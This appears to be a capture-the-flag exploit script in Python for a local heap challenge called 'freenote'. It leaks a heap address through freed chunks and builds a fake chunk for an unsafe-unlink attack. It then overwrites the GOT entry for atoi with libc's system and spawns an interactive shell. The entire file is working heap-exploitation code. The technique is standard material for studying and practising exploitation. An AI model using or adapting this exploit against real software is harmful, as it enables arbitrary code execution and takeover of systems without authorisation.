#!/usr/bin/env python
# coding:utf-8

from ctf import *

# context.log_level = 'debug'

cmd = '''
'''
# io = debug('./freenote'); io.send(cmd); io.r()
io = process('./freenote')

elf = ELF('./freenote')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def list_note():
    io.sendlineafter(': ', 1)

def new_note(content):
    io.sendlineafter('choice: ', 2)
    io.sendlineafter(': ', len(content))
    io.sendafter(': ', content)

def edit_note(note_id, content):
    io.sendlineafter('choice: ', 3)
    io.sendlineafter(': ', note_id)
    io.sendlineafter(': ', len(content))
    io.sendafter(': ', content)

def delete_note(note_id):
    io.sendlineafter('choice: ', 4)
    io.sendlineafter(': ', note_id)

# Create note 0-8, free 0-7, the last is to avoid consolidating.
for i in xrange(9):
    new_note('A')

# Free 0 first, so that the 7 will link with 0 when free.
delete_note(0)
for i in xrange(7, 0, -1):
    delete_note(i)

# Create a note of length 0x90 * 7 to leek the FD pointer of previous chunk 8.
payload = cyclic(0x90 * 7)
new_note(payload)
list_note()
io.recvuntil(payload)
note_list_addr = unpack(io.recvline(keepends=False), 'all') - 0x1800
log.info('note list address: {:#x}'.format(note_list_addr))
delete_note(0)

# Construct fake trunk to unlink. After free, notes[0]->str = &notes[0]->str - 24
payload = cyclic(8) + p64(0x80 | 1) # this thunk is free, so will be unlink for consolidation
payload += p64(note_list_addr - 8) + p64(note_list_addr) # to bypass the check for FD and BK
payload += cyclic(0x80 - 0x20)
payload += p64(0x80) + p64(0x90) # free this thunk
payload += cyclic(0x80)
payload += p64(0x80) + p64(0x90 | 1) # this thunk is in use to avoid consolidation
payload += cyclic(0x80)
payload += p64(0x90) + p64(0x90 | 1) # use this thunk head to
new_note(payload)
delete_note(1)
note0_len = len(payload)

# Overwrite note list, let notes[0]->str == got of atoi, notes[0]->len = 8
payload = p64(0x10)
payload += p64(1) + p64(8) + p64(elf.got['atoi'])
payload = ljust(payload, note0_len, '\x00')
edit_note(0, payload)

# List note to leak address of free
list_note()
io.recvuntil('0. ')
atoi_addr = unpack(io.recvline(keepends=False), 'all')
log.info('atoi address: {:#x}'.format(atoi_addr))
libc_base = atoi_addr - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']
log.info('system address: {:#x}'.format(system_addr))

edit_note(0, p64(system_addr))
io.sendline('/bin/sh')
io.clean()

# io.interrupt()
# io.sendline('x/64xg *(void**)0x00000000006020A8')
# io.sendline('x/4x 0x0000000000604c20 - 0x10')
io.interactive()
